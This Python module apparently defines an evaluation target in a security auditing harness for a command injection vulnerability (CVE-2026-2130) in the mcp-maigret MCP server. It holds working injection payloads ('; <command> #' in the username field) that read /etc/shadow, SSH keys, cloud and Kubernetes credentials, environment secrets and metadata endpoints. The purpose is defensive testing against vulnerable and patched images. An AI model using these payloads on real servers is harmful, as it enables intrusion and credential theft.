"""CVE-2026-2130: mcp-maigret shell command injection (CWE-77).

mcp-maigret 1.0.12 builds `docker run ... soxoj/maigret:latest <username> --<format> ...` as a
single shell string from the unsanitised `username` (same flaw in `parse_url`'s `url`) and runs
it through `child_process.exec`, so a shell metacharacter in `username` runs an arbitrary
command in the server's container. 1.0.13 validates `username` against `^[a-zA-Z0-9_.-]+$` and
runs docker through `execFile` with an argument array, so no shell parses the input.

Every exploit injects `; <command> #` as the username; the server's own shell runs <command>
and its stdout comes back in the tool response. One dedicated exploit per kept place names the
location it reads. The benign call searches a plain username, which the patched validator
accepts and which runs the real maigret to completion (offline, so it fails fast and returns
within the client timeout).
"""

import re
from collections.abc import Awaitable, Callable

from evals.cve_environments import command_injection_env
from evals.cve_grammar import MechanismClass
from evals.cve_places import Place, Places, PlantKind
from evals.cve_planting import PlantingHost, SymbolicUser
from evals.cve_planting_spec import resolve_container_path
from evals.cve_targets import CVETarget
from mcp_auditor.domain.ports import MCPClientPort

WORKDIR = "/tmp"  # the server's working directory; writable under the read-only /srv mount
BENIGN_USERNAME = "testuser"
TOOL = "search_username"

# The command-injection signature: the username carries a shell command separator. Every
# exploit payload starts with it; the benign username (letters only) does not.
AIM = re.compile(r";")

# Every command_execution-reachable place of a plantable kind (file / env / account / hostname /
# http_endpoint). The unplaceable and layout places, and the internal_fetch-only places, are
# excluded in the draw, not here.
KEPT_PLACES: tuple[str, ...] = (
    "process-account-identity",
    "proc-environ",
    "container-hostname",
    "etc-shadow",
    "aws-credentials",
    "gcloud-adc",
    "azure-profile",
    "ssh-private-key",
    "shell-history",
    "git-credentials",
    "npmrc",
    "gh-hosts",
    "docker-config",
    "kube-config",
    "pgpass",
    "mysql-client-cnf",
    "mongorc",
    "mysql-system-cnf",
    "run-secrets",
    "k8s-sa-token",
    "etc-hosts",
    "auth-log",
    "imds",
    "ecs-task-credentials",
    "eks-pod-identity",
)


def _file_paths(place: Place) -> tuple[str, ...]:
    if place.coordinates.paths is not None:
        return place.coordinates.paths
    assert place.coordinates.path is not None
    return (place.coordinates.path,)


def injection_command(place: Place) -> str:
    kind = place.kind
    if kind is PlantKind.FILE:
        paths = " ".join(resolve_container_path(p, WORKDIR) for p in _file_paths(place))
        return f"cat {paths}"
    if kind is PlantKind.ENV:
        return "cat /proc/self/environ"  # the server's env, carrying the planted secret
    if kind is PlantKind.ACCOUNT:
        return "whoami"  # the account the server runs as (its nonce is the username)
    if kind is PlantKind.HOSTNAME:
        return "uname -n"
    if kind is PlantKind.HTTP_ENDPOINT:
        assert place.coordinates.host is not None and place.coordinates.path is not None
        return f"curl -s http://{place.coordinates.host}{place.coordinates.path}"
    raise ValueError(f"{place.id}: no injection for kind {kind}")


def payload(place: Place) -> str:
    # `; <cmd> #`: the leading `;` leaves the `docker run ... soxoj/maigret:latest` call with no
    # username (maigret exits fast), then runs <cmd>; `#` comments out the trailing maigret flags.
    return f"; {injection_command(place)} #"


def _exploit(place_id: str) -> Callable[[Places, MCPClientPort], Awaitable[None]]:
    async def run(places: Places, client: MCPClientPort) -> None:
        await client.call_tool(TOOL, {"username": payload(places[place_id])})

    return run


async def _benign(places: Places, client: MCPClientPort) -> None:
    await client.call_tool(TOOL, {"username": BENIGN_USERNAME})


TARGET = CVETarget(
    cve_id="CVE-2026-2130",
    severity="CVSS 6.3 (v3.1, GHSA)",
    mechanism=MechanismClass.COMMAND_EXECUTION,
    aim=AIM,
    reaches=frozenset({"command_execution"}),
    kept_places=KEPT_PLACES,
    images=("holdout-2026-2130-maigret",),
    server_image="holdout-2026-2130-maigret",
    patched_image="holdout-2026-2130-maigret-patched",
    planting_host=PlantingHost(SymbolicUser.UNPRIVILEGED, WORKDIR, has_network=False),
    builder=command_injection_env,
    exploits=tuple(_exploit(place_id) for place_id in KEPT_PLACES),
    benign=_benign,
    awaited_capability=None,
    note=(
        "Command injection (CWE-77): an unsanitised username in search_username/parse_url is built "
        "into a docker shell string and run through child_process.exec, so a shell metacharacter "
        "executes an arbitrary command in the server's container."
    ),
    tools_filter=None,
)
